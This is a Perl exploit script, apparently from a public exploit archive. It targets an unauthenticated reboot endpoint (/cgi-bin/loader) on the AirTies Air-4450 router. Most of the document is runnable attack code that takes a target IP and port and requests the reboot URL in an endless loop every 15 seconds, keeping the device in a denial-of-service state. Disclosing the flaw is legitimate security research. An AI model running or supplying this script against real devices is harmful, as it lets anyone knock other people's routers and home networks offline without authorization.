#!/usr/bin/perl
#
# Title: AirTies-4450 Unauthorized Remote Reboot [DoS].
# Type: hardware
# Tested on firmware: AirTies_Air4450_RU_FW_1.1.2.18.bin
#
# Author: rigan - imrigan [sobachka] gmail.com
#
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#
# The description of the device from a site of the vendor:
#
# With its Access Point and Router functionality, the Air 4450 provides wireless Internet access over
# ADSL and Cable modems. Air 4450 uses 802.11n technology providing wireless data transfer
# rates of up to 300 Mbps. Thus, you can transfer data, watch videos or upload your pictures to the
# Internet at .N-speed.. Providing 6 times faster wireless communications compared to earlier
# technologies, and 4 times greater wireless range through use of MIMO technology*, Air 4450 has
# been developed to meet all your wireless needs.
#
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#
# The vulnerability:
#
# http://192.168.1.1/cgi-bin/loader - This cgi script allows to reboot the device via GET request.
#
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
use LWP::Simple;
print "[*] AirTies Air-4450 Remote Dos Exploit\n";
if (@ARGV != 2){
   print "[*] Usage: perl airdos.pl ip port   \n";
   exit(1);
}
while (@ARGV > 0){
   $ip = shift(@ARGV);
   $port = shift(@ARGV);
}
$url = "http://".$ip.":".$port."/cgi-bin/".loader;
print "[*] DoS ...............................\n";
while(1){
get($url);
sleep(15);
}
